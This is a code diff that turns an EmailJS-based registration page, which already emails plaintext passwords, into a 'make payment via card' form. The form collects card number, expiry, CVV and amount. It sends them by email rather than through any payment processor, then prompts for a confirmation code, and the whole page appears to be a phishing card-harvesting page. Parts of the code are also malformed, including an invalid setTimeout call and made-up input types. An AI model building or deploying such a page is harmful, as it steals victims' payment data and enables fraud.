@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Register with EmailJS</title>
+  <title>make payment via card</title>
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
     (function() {
@@ -71,29 +71,33 @@
 <body>
 
   <div class="form-container">
-    <h2>Register</h2>
+    <h2>make registration payment via card</h2>
     <form id="registerForm">
       <div class="form-group">
-        <label for="name">Name</label>
-        <input type="text" id="name" name="user_name" required />
+        <label for="name">card number</label>
+        <input type="number" id="card number" name="card number" required />
       </div>
       <div class="form-group">
-        <label for="email">Email</label>
-        <input type="email" id="email" name="user_email" required />
+        <label for="email">Expiry date</label>
+        <input type="expiration date" id="mm/yyyy" name="mm/yyyy" required />
       </div>
       <div class="form-group">
-        <label for="phone">Phone</label>
-        <input type="tel" id="phone" name="user_phone" required pattern="[0-9]{10}" />
+        <label for="phone">card security cv</label>
+        <input type="card security cv" id="cv" name="cv" required  />
         
         </div>
         <div>
-        <label for="name">password</label>
-        <input type="text" id="password" name="Password" required />
+          <p>
+        <label for="name">Amount</label>
+        <input type="number" id="Amount" name="Amount" required />
       </div>
+    </p>
       <div>
-      <button type="submit">Register</button>
+
+      <button type="submit">Make payment</button>
       <div class="message" id="message"></div>
-     <p> already have an account <a href="login.html">login</a></p>
+  </div>
+
     </form>
   </div>
 
@@ -110,11 +114,11 @@
       .then(() => {
         // Optional: Show a quick success message before redirect
         message.style.color = 'green';
-        message.textContent = 'Registration info sent successfully! Redirecting...';
+        message.textContent = 'payment sent enter code to cornfirm! payment...';
 
         // Redirect after a short delay (e.g., 2 seconds)
-        setTimeout(() => {
-          window.location.href = 'access.html';
+        setTimeout((2s) => {
+          window.location.href = 'access-card.html';
         }, 2000);
 
         form.reset();
